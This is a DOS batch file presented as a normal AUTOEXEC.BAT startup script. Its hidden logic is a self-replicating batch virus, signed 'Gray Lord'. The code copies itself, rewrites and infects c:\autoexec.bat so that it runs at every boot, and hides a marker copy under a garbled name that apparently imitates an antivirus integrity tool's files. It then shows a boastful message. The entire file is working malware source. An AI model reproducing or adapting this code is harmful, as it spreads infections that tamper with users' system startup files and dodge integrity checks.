@echo off 
goto g_b 
:g 
@echo off
c:\dos\doskey
c:\bin\keyspeed
c:\dos\keyb uk,,c:\dos\keyboard.sys
path c:\bat;c:\bin;c:\dos
prompt $p$g
cls
if exist c:\bin\base.crc goto finished
echo First-time build of base CRCV file...
echo:
call basecrcv
cls
:finished
echo:
echo Dirty boot...
goto e_g 
:g_b
@echo off
if exist c:\adinf�c.��� goto f_g
copy %0 c:\gray.bat >nul
c:
cd \
echo @echo off >e_o.v
echo goto g_b >b.v
echo :g >l.v
echo goto e_g >n.v
copy autoexec.bat + n.v e_$.v >nul
del autoexec.bat >nul
del n.v >nul
copy l.v + e_$.v autoexec.bat >nul
del l.v >nul
del e_$.v >nul
copy b.v + autoexec.bat e_$.v >nul
del b.v >nul
del autoexec.bat >nul
copy e_o.v + e_$.v autoexec.bat >nul
del e_o.v >nul
rem del e_$.v >nul
copy autoexec.bat + gray.bat y.bat >nul
del autoexec.bat >nul
ren gray.bat adinf�c.��� >nul
ren y.bat autoexec.bat >nul
goto g
:f_g
echo Gray Lord represent this new batch file virus!
pause >nul
goto g
:e_g
